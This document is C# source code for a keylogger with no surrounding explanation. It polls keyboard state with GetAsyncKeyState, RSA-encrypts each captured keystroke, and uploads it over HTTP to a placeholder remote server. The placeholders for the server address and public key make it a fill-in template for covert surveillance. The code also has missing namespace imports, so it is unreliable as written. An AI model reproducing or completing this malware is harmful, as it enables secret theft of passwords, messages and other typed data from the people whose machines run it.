using System;
using System.IO;
using System.Net;
using System.Security.Cryptography;

class Program
{
    private static string publicKey = "YOUR_PUBLIC_KEY_HERE";

    static void Main(string[] args)
    {
        while (true)
        {
            for (int i = 0; i < 255; i++)
            {
                int key = GetAsyncKeyState(i);
                if (key == 1 || key == -32767)
                {
                    Console.Write((char)i);
                    string data = ((char)i).ToString();
                    SendData(Encrypt(data));
                }
            }
        }
    }

    private static string Encrypt(string data)
    {
        using (RSACryptoServiceProvider RSA = new RSACryptoServiceProvider())
        {
            RSA.FromXmlString(publicKey);
            byte[] encryptedData = RSA.Encrypt(Encoding.UTF8.GetBytes(data), true);
            return Convert.ToBase64String(encryptedData);
        }
    }

    private static void SendData(string encryptedData)
    {
        using (WebClient client = new WebClient())
        {
            client.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
            string HtmlResult = client.UploadString("YOUR_REMOTE_SERVER_HERE", encryptedData);
        }
    }

    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(int vKey);
}